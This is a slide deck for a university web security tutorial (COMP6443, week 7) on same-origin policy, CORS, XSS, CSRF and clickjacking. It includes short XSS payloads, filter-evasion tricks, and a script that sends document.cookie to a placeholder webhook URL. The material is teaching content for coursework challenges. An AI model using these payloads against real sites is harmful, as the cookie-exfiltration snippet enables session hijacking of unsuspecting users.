---
title: "07: xss"
layout: "bundle"
outputs: ["Reveal"]
---

## We'll get started at 5 past

---

{{< slide class="center" >}}
# Week07
### COMP6443 H18A 
Cross Site Scripting (XSS)

---

# House cleaning 
{{% section %}}

## Due Dates
* Some of the XSS related challenges are out now. Some are broken.... thanks @melon
* These are due Week08 Sunday @ 11:59pm

---

## Report groups
* The second report is coming soon (I think)
* Same groups! But with feedback ;) 
* Marks/feedback will be out at some point
> (But I marked your reports if you want some feedback today shh...)

{{% /section %}}

---

## Origin vs Site

### Origin
> <span style="color: #021691">https://</span><span style="color: #fffacd">www\.example\.com</span><span style="color: #7FFFD4">:80</span>

{{% fragment %}}
origin = <span style="color: #021691">scheme</span> + <span style="color: #fffacd">host</span> + <span style="color: #7FFFD4">port</span>
{{% /fragment %}}

* This is where some request came from! (Or did it)

---

## Origin vs Site
### Site
> <span style="color: #021691">http://</span><span style="color: #A52A2A">www.</span><u><span style="color: #fffacd">example</span><span style="color: #D2691E">.com</span></u><span style="color: #7FFFD4">:80</span>
> <span style="color: #021691">https://</span><span style="color: #A52A2A">api.</span><u><span style="color: #fffacd">example</span><span style="color: #D2691E">.com</span></u><span style="color: #7FFFD4">:443</span>

{{% fragment %}}
site = <span style="color: #fffacd">private_domain</span> + <span style="color: #D2691E">public_suffix</span>
* <s><span style="color: #021691">scheme</span>, <span style="color: #A52A2A">subdomain</span> and <span style="color: #7FFFD4">port</span></s>
{{% /fragment %}}

* COMPLETELY DIFFERENT WEBSITE!

---

So what are some restrictions on these Sites and Origins?

---

{{% section %}}

## SOP (Same Origin Policy)
* Browser feature! (1995)

* Restricts getting resources to/from an *external* site
> If you request something from another website, Same Origin Policy says that you cant access any of the resources because its only accessible on the same origin!

---

* "*External*" is based on *SOP*: only requests from the same `origin` are allowed to use the resources

> read more [here](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

---

## Why is this good?

* Basically you used to be able to just send a request to a website and randomly access everything about that website.
- Javascript running
- Sending requests
- Setting cookies

> Old days of the interwebs.

---

But Jesse if we block all these requests to resources how do we get our [cute cat photos](https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIzLTA5L3Jhd3BpeGVsX29mZmljZV8zNF9mbHVmZnlfY2h1YmJ5X3Bhc3RlbF9jYXRzX2thd2FpaV9hZXN0aGV0aWNfM182YTJkZjRmNS03NTZiLTQyODgtOWQ4Mi1lZmRlMmE1MTA2OWRfMS5qcGc.jpg)?

> CORS

Who has heard of this?

---

### Cross-Origin Resource Sharing
* Obviously sometimes you need to access resources from another origin (e.g. using images, videos)

* This can be achieved if the resource owner sets certain headers on the resource ([more here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers))

For example:

This lets any origin load the resource 
```
Access-Control-Allow-Origin: *
```

---

### Can it be bypassed
* It's just a browser protection
* Doesn't prevent the request (it'll still succeed), it prevents you from accessing the response.
* Would it block you if accessed it through a script?

---

### This is confusing I KNOW

So SOP prevents us from loading resources.
CORS allows specific origins to load specific resources.

For example, if I clicked someones malicious link, because of SOP, if the malicious website 
sent a request to `Bank.com`, the request would be blocked!

> IM SAFE!

{{% /section %}}

---

## Client-side injection
* HTML Injection
* XSS
* CSRF

---

{{% section %}}

## HTML?

Html is basically just a bunch of tags that look like this: 

```html
<div>
    <p>stuff</p>
</div>
```

We have seen this alot in our developer tools!
The `elements` part of the devtools is called the DOM!

---
### HTML injection
* Browsers just render the DOM (HTML ELEMENTS)
* How would it know if tags are user-supplied or server-supplied
* what if our input was just `<s>`?

---

## DEMO

---

### Know your tags
* Some are paired `<div></div>`
* Some can be unpaired `<img src=.../>`
* what goes in here? `<script>...</script>`

{{% /section %}}

---

{{% section %}}

### XSS (Cross-site scripting)
* Not technically "cross-site"
* Think of it as "Javascript Injection"
* Your browser can take in inputs and place them inside the DOM (html elements)
    * If you do this insecurely you can execute arbitrary javascript
* Tricking a **browser** into executing your code

---

### Reflected XSS
* Payload is part of user input
    * e.g. a search query, cookie, header, etc 
    * anything insecurely rendered on the page

> [`www.example.com/database?q=<script>alert(1)</script>`]()

---

### Stored XSS
* Payload is stored in some database
    * Anybody who visits a certain page will view it
    * e.g. blog posts, twitter (lol)
* generally worse, but more easily detected

---

### DOM-based XSS
* Similar to the others, but the vulnerability comes from modifying the DOM
* document is basically like a global variable that lets you modify/view all the elements in the dom

```html
<script>
const pos=document.URL.indexOf("context=")+8; 
document.write(document.URL.substring(pos,document.URL.length)); 
</script>
```

---

### Demo!

---

* Reflected
* Stored
* Dom Based

---

### XSS isn't just `<script>` tags
```javascript
// event-handlers
<img src=x onerror="alert(1)"/>
 
// injecting into javascript code
const a = '<user_input>'

// and much more
```

> it's any time you get user supplied input in a javascript context

---

### Some good resources
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
* [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
* [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
* [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

{{% /section %}}

---

### Bonus: breaking mitigations
* Content stripped/blocked
    * different tag `<img onerror=...>` !!IMPORTANT!!
    * different event handler `<body onload=...>` !!IMPORTANT!!
    * embed dummy characters: `<SCRscriptIPT>`
    * use alternating case: `<ScRiPt>`
    
> [here's a couple more](https://github.com/payloadbox/xss-payload-list)


---

{{% section %}}

How do you solve these challenges?

> requestbin/webhooks

```javascript
<script>
fetch("webhookurl?"+ document.cookie)
</script>
```

---

> MY COOKIES!!! 

Oh well.

---

### Cookies (SameSite)
* *None*: Cookies are always sent
* *Lax*: (default) not sent cross-site
    * images/iframes *`no`*
    * navigation (GET)    *`yes`*
* *Strict*: Cookies aren't sent

> read more [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)


{{% /section %}}

---

## CSRF

{{% section %}}

### What is it?
* Cross-site request forgery
* Trick a user into performing an unintended action
    * e.g. make them authorize a bank transaction
    * e.g. make them change their email/password
* *kinda similar to SSRF*

---

###

```
<form method="POST" >
```

---

### Demo!

{{% /section %}}

---

## Click-jacking

{{% section %}}

* A fake form sitting under a real form

* if you try to interact with the fake form, you'll accidentally interact with the real one. 

* This could be either local, or external
    * local: same form switch confirm/cancel buttons
    * external: an invisible iframe with a higher z-index

---

### Demo

{{% /section %}}

---
